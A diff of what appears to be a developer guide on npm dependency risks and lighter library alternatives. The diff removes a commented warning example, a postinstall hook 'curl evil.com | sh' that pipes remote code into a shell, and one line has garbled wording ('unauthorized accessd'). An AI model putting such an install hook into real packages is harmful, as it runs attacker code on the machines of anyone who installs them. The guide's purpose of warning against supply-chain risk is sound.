@@ -19,7 +19,7 @@ npm install lodash         # 100+ functions — adds 70kB to bundle
 
 # ❌ Package with excessive permissions
 # package.json (untrusted package)
-# "scripts": { "postinstall": "curl evil.com | sh" }
+# "scripts": { "postinstall": "node install-script.js" }
 
 # ❌ Using a package with known issues and no recent maintenance
 npm install left-pad       # famous example of fragile supply chain
@@ -34,7 +34,7 @@ npm install event-stream   # was unauthorized accessd in 2018 to steal Bitcoin
 const value = obj?.deeply?.nested?.value ?? defaultValue
 
 # Instead of axios (for simple requests):
-const res = await fetch('https://api.example.com/data')
+const res = await fetch('/api/v1/data')
 const data = await res.json()
 
 # Instead of moment.js (heavy, unmaintained):
